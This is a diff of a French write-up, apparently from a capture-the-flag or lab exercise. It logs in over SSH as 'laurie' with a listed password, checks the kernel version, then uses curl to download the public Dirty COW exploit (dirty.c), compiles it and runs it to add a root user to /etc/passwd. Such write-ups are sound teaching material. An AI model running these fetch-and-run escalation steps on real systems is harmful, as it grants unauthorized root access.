@@ -2,20 +2,20 @@
 
 - Cette faille disponible sur les linux version 2.6.22 (2007) à 4.8.3 (2016) permet d'ecrire sur des fichiers accessible uniquement en lecture seule
 - On se connecte donc a **laurie**:**330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4** en ssh
-- On regarde par regarder la version du linux pour savoir si l'exploit est utilisable
+- On regarde donc la version du linux pour savoir si l'exploit est compatible
 ```
 $> uname -r
 
 3.2.0-91-generic-pae
 ```
-- L'exploit est donc compatible avec notre version de linux
-- On lance donc l'exploit
+- L'exploit est compatible avec notre version de linux
+- On lance l'exploit
 ```
 curl -O https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
 gcc -pthread dirty.c -o dirty -lcrypt
 ./dirty
 ```
-- L'exploit arrive donc a ecrire un nouvelle utilisateur root dans /etc/passwd 
+- L'exploit arrive a ecrire un nouvelle utilisateur root dans /etc/passwd 
 
 ## Source
 - [Explication](https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/index.html#what-is-cow)
